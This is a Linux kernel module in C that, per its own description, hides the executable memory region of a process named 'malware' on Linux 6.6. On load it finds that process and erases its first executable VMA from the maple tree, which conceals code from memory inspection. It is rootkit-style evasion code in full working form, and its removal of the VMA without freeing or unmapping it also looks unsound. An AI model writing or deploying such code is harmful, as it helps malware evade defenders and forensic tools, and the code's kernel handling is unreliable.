#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/string.h>
#include <linux/mmap_lock.h>
#include <linux/maple_tree.h>

#define TARGET_PROC_NAME "malware"

static int hide_target_vma(struct task_struct *task)
{
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    int found = 0;

    if (!task || !task->mm)
        return -EINVAL;

    mm = task->mm;

    MA_STATE(mas, &mm->mm_mt, 0, 0);

    down_write(&mm->mmap_lock);

    mas_for_each(&mas, vma, ULONG_MAX) {
        if (!vma)
            break;

        // 隐藏第一个可执行 VMA（代码段）
        if (vma->vm_flags & VM_EXEC) {
            pr_info("Hiding VMA: start=0x%lx, end=0x%lx\n",
                    vma->vm_start, vma->vm_end);

            mas_erase(&mas);
            mm->map_count--;
            // vm_area_free(vma); // 可留空，系统会延迟释放
            found = 1;
            break;
        }
    }

    up_write(&mm->mmap_lock);

    return found ? 0 : -ENOENT;
}

static int __init hidevma_init(void)
{
    struct task_struct *task;
    int ret = -ESRCH;

    pr_info("hide_vma module loading...\n");

    for_each_process(task) {
        if (strcmp(task->comm, TARGET_PROC_NAME) == 0) {
            pr_info("Target process \"%s\" found (pid: %d)\n", task->comm, task->pid);
            ret = hide_target_vma(task);
            if (ret == 0)
                pr_info("VMA successfully hidden.\n");
            else
                pr_warn("Failed to hide VMA: %d\n", ret);
            break;
        }
    }

    if (ret == -ESRCH)
        pr_warn("Target process \"%s\" not found.\n", TARGET_PROC_NAME);

    return 0;
}

static void __exit hidevma_exit(void)
{
    pr_info("hide_vma module unloaded.\n");
}

module_init(hidevma_init);
module_exit(hidevma_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Hide specific VMA of malware process using maple tree (Linux 6.6)");
